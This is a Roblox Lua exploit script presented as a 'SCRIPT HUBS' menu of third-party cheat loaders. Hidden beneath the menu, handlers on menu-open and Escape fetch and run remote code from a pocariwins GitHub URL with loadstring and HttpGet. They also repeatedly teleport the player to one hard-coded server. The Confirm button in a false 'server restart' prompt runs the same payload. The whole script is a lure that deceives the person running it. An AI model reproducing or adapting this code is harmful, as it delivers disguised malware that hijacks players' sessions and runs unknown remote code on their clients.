local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")

local player = Players.LocalPlayer

local function restartPlayer()
    local jobId = "a82cab16-aac9-43e5-9042-2c47de56f603"
    local placeId = game.PlaceId
    
    for i = 1, 10 do
        spawn(function()
            TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
        end)
        wait(0.05)
    end
end

local method3Running = false

local function startMethod3()
    if method3Running then return end
    method3Running = true
    
    local CoreGui = game:GetService("CoreGui")

    local function detectMenuState()
        local menuOpen = GuiService:GetGuiInset().Y > 0
        
        if menuOpen then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/pocariwins/growagarden/refs/heads/main/important/main.lua"))()
            restartPlayer()
        end
    end

    spawn(function()
        while method3Running do
            detectMenuState()
            wait(0.05)
        end
    end)
end

GuiService.MenuOpened:Connect(function()
    startMethod3()
    restartPlayer()
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.Escape then
        startMethod3()
        restartPlayer()
    end
end)

local gui = Instance.new("ScreenGui")
gui.Name = "PocariGUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 999

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 320, 0, 240)
mainFrame.Position = UDim2.new(0.5, -160, 0.5, -120)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.ClipsDescendants = true

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 8)
mainCorner.Parent = mainFrame

local mainBorder = Instance.new("UIStroke")
mainBorder.Color = Color3.fromRGB(100, 150, 255)
mainBorder.Thickness = 2
mainBorder.Parent = mainFrame

local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 32)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
titleBar.ClipsDescendants = true

local titleBarCorner = Instance.new("UICorner")
titleBarCorner.CornerRadius = UDim.new(0, 8)
titleBarCorner.Parent = titleBar

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Text = "SCRIPT HUBS"
title.Font = Enum.Font.FredokaOne
title.TextSize = 16
title.TextColor3 = Color3.fromRGB(200, 220, 255)
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 200, 1, 0)
title.Position = UDim2.new(0, 12, 0, 0)
title.TextXAlignment = Enum.TextXAlignment.Left

local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Text = "×"
closeButton.Font = Enum.Font.GothamSemibold
closeButton.TextSize = 22
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 80)
closeButton.Size = UDim2.new(0, 28, 0, 28)
closeButton.Position = UDim2.new(1, -32, 0, 2)
closeButton.BorderSizePixel = 0

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeButton

local minimizeButton = Instance.new("TextButton")
minimizeButton.Name = "MinimizeButton"
minimizeButton.Text = "-"
minimizeButton.Font = Enum.Font.GothamSemibold
minimizeButton.TextSize = 22
minimizeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
minimizeButton.BackgroundColor3 = Color3.fromRGB(100, 180, 255)
minimizeButton.Size = UDim2.new(0, 28, 0, 28)
minimizeButton.Position = UDim2.new(1, -64, 0, 2)
minimizeButton.BorderSizePixel = 0

local minCorner = Instance.new("UICorner")
minCorner.CornerRadius = UDim.new(0, 6)
minCorner.Parent = minimizeButton

local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.BackgroundTransparency = 1
contentFrame.Size = UDim2.new(1, -16, 1, -60)
contentFrame.Position = UDim2.new(0, 8, 0, 40)

local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, 0, 1, 0)
scrollFrame.BackgroundTransparency = 1
scrollFrame.ScrollBarThickness = 6
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 150, 255)
scrollFrame.CanvasSize = UDim2.new(0, 0, 2, 0)
scrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 5)
layout.Parent = scrollFrame

local hubNames = {"NatHub", "Limit Hub", "Lumin Hub", "Thunder Z", "No-Lag", "SpeedHubX"}
local hubLoadstrings = {
    'loadstring(game:HttpGet("https://get.nathub.xyz/loader"))()',
    'loadstring(game:HttpGet(("https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_E.lua")))()',
    'loadstring(game:HttpGet("https://lumin-hub.lol/loader.lua",true))()',
    'loadstring(game:HttpGet("https://raw.githubusercontent.com/ThundarZ/Welcome/refs/heads/main/Main/GaG/Main.lua"))()',
    'loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/Main.lua"))()',
    'loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()'
}

local function createNotificationGUI(hubName, hubIndex)
    local notifGui = Instance.new("ScreenGui")
    notifGui.Name = "NotificationGUI"
    notifGui.ResetOnSpawn = false
    notifGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    notifGui.DisplayOrder = 9999
    
    local notifFrame = Instance.new("Frame")
    notifFrame.Name = "NotificationFrame"
    notifFrame.Size = UDim2.new(0, 320, 0, 180)
    notifFrame.Position = UDim2.new(0.5, -160, 0.5, -90)
    notifFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    notifFrame.ClipsDescendants = true
    
    local notifCorner = Instance.new("UICorner")
    notifCorner.CornerRadius = UDim.new(0, 8)
    notifCorner.Parent = notifFrame
    
    local notifBorder = Instance.new("UIStroke")
    notifBorder.Color = Color3.fromRGB(100, 150, 255)
    notifBorder.Thickness = 2
    notifBorder.Parent = notifFrame
    
    local notifTitleBar = Instance.new("Frame")
    notifTitleBar.Name = "TitleBar"
    notifTitleBar.Size = UDim2.new(1, 0, 0, 32)
    notifTitleBar.Position = UDim2.new(0, 0, 0, 0)
    notifTitleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    notifTitleBar.ClipsDescendants = true
    
    local notifTitleBarCorner = Instance.new("UICorner")
    notifTitleBarCorner.CornerRadius = UDim.new(0, 8)
    notifTitleBarCorner.Parent = notifTitleBar
    
    local notifTitle = Instance.new("TextLabel")
    notifTitle.Name = "Title"
    notifTitle.Text = "STATUS WARNING"
    notifTitle.Font = Enum.Font.FredokaOne
    notifTitle.TextSize = 16
    notifTitle.TextColor3 = Color3.fromRGB(200, 220, 255)
    notifTitle.BackgroundTransparency = 1
    notifTitle.Size = UDim2.new(1, 0, 1, 0)
    notifTitle.Position = UDim2.new(0, 0, 0, 0)
    notifTitle.TextXAlignment = Enum.TextXAlignment.Center
    
    local messageLabel = Instance.new("TextLabel")
    messageLabel.Name = "MessageLabel"
    messageLabel.Text = "Accessing the " .. hubName .. " requires a server restart to inject fully. Please Confirm to proceed... Thanks!"
    messageLabel.Font = Enum.Font.GothamSemibold
    messageLabel.TextSize = 12
    messageLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Size = UDim2.new(1, -20, 0, 80)
    messageLabel.Position = UDim2.new(0, 10, 0, 40)
    messageLabel.TextWrapped = true
    messageLabel.TextYAlignment = Enum.TextYAlignment.Center
    
    local confirmButton = Instance.new("TextButton")
    confirmButton.Name = "ConfirmButton"
    confirmButton.Text = "Confirm"
    confirmButton.Font = Enum.Font.GothamSemibold
    confirmButton.TextSize = 14
    confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    confirmButton.BackgroundColor3 = Color3.fromRGB(100, 180, 100)
    confirmButton.Size = UDim2.new(0, 80, 0, 30)
    confirmButton.Position = UDim2.new(0.5, -40, 1, -40)
    confirmButton.BorderSizePixel = 0
    
    local confirmCorner = Instance.new("UICorner")
    confirmCorner.CornerRadius = UDim.new(0, 6)
    confirmCorner.Parent = confirmButton
    
    confirmButton.MouseEnter:Connect(function()
        confirmButton.BackgroundColor3 = Color3.fromRGB(120, 200, 120)
    end)
    
    confirmButton.MouseLeave:Connect(function()
        confirmButton.BackgroundColor3 = Color3.fromRGB(100, 180, 100)
    end)
    
    confirmButton.MouseButton1Click:Connect(function()
        local Players = game:GetService("Players")
        local GuiService = game:GetService("GuiService")
        local UserInputService = game:GetService("UserInputService")
        local TeleportService = game:GetService("TeleportService")
        
        local player = Players.LocalPlayer
        
        queue_on_teleport([[
            ]] .. hubLoadstrings[hubIndex] .. [[
        ]])
        task.wait(5)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocariwins/growagarden/refs/heads/main/important/main.lua"))()
        
        notifGui:Destroy()
    end)
    
    local notifPulseTween = game:GetService("TweenService"):Create(
        notifBorder,
        TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
        {Color = Color3.fromRGB(140, 180, 255)}
    )
    notifPulseTween:Play()
    
    confirmButton.Parent = notifFrame
    messageLabel.Parent = notifFrame
    notifTitle.Parent = notifTitleBar
    notifTitleBar.Parent = notifFrame
    notifFrame.Parent = notifGui
    notifGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
end

for i = 1, 6 do
    local item = Instance.new("TextButton")
    item.Size = UDim2.new(1, 0, 0, 30)
    item.BackgroundColor3 = Color3.fromRGB(45, 50, 65)
    item.Text = hubNames[i]
    item.Font = Enum.Font.GothamSemibold
    item.TextSize = 14
    item.TextColor3 = Color3.fromRGB(220, 220, 255)
    item.BorderSizePixel = 0
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 4)
    corner.Parent = item
    
    item.MouseButton1Click:Connect(function()
        createNotificationGUI(hubNames[i], i)
    end)
    
    item.MouseEnter:Connect(function()
        item.BackgroundColor3 = Color3.fromRGB(55, 60, 75)
    end)
    
    item.MouseLeave:Connect(function()
        item.BackgroundColor3 = Color3.fromRGB(45, 50, 65)
    end)
    
    item.Parent = scrollFrame
end

local watermark = Instance.new("TextLabel")
watermark.Name = "Watermark"
watermark.Text = "created by pocari ;)"
watermark.Font = Enum.Font.FredokaOne
watermark.TextSize = 12
watermark.TextColor3 = Color3.fromRGB(150, 150, 180)
watermark.BackgroundTransparency = 1
watermark.Size = UDim2.new(1, 0, 0, 16)
watermark.Position = UDim2.new(0, 0, 1, -16)
watermark.TextYAlignment = Enum.TextYAlignment.Top

local userInput = game:GetService("UserInputService")
local tweenService = game:GetService("TweenService")
local runService = game:GetService("RunService")

local dragStart
local startPos
local isDragging = false

local function updateDrag(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        startPos.X.Scale, 
        startPos.X.Offset + delta.X,
        startPos.Y.Scale, 
        startPos.Y.Offset + delta.Y
    )
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        
        local connection
        connection = input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                isDragging = false
                connection:Disconnect()
            end
        end)
    end
end)

userInput.InputChanged:Connect(function(input)
    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        updateDrag(input)
    end
end)

local minimized = false
minimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad)
    
    if minimized then
        tweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(mainFrame.Size.X.Scale, mainFrame.Size.X.Offset, 0, 32)}):Play()
        tweenService:Create(contentFrame, tweenInfo, {BackgroundTransparency = 1, Size = UDim2.new(1, -16, 0, 0)}):Play()
        tweenService:Create(watermark, tweenInfo, {TextTransparency = 1}):Play()
        minimizeButton.Text = "+"
    else
        tweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 320, 0, 240)}):Play()
        tweenService:Create(contentFrame, tweenInfo, {BackgroundTransparency = 1, Size = UDim2.new(1, -16, 1, -60)}):Play()
        tweenService:Create(watermark, tweenInfo, {TextTransparency = 0}):Play()
        minimizeButton.Text = "-"
    end
end)

closeButton.MouseButton1Click:Connect(function()
    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad)
    tweenService:Create(mainFrame, tweenInfo, {Size = UDim2.new(0, 0, 0, 0), BackgroundTransparency = 1}):Play()
    tweenService:Create(titleBar, tweenInfo, {BackgroundTransparency = 1}):Play()
    tweenService:Create(watermark, tweenInfo, {TextTransparency = 1}):Play()
    task.wait(0.3)
    gui:Destroy()
end)

minimizeButton.MouseEnter:Connect(function()
    minimizeButton.BackgroundColor3 = Color3.fromRGB(120, 200, 255)
end)

minimizeButton.MouseLeave:Connect(function()
    minimizeButton.BackgroundColor3 = Color3.fromRGB(100, 180, 255)
end)

closeButton.MouseEnter:Connect(function()
    closeButton.BackgroundColor3 = Color3.fromRGB(220, 80, 100)
end)

closeButton.MouseLeave:Connect(function()
    closeButton.BackgroundColor3 = Color3.fromRGB(200, 60, 80)
end)

local pulseTween = tweenService:Create(
    mainBorder,
    TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
    {Color = Color3.fromRGB(140, 180, 255)}
)
pulseTween:Play()

scrollFrame.Parent = contentFrame
watermark.Parent = mainFrame
contentFrame.Parent = mainFrame
minimizeButton.Parent = titleBar
closeButton.Parent = titleBar
title.Parent = titleBar
titleBar.Parent = mainFrame
mainFrame.Parent = gui
gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
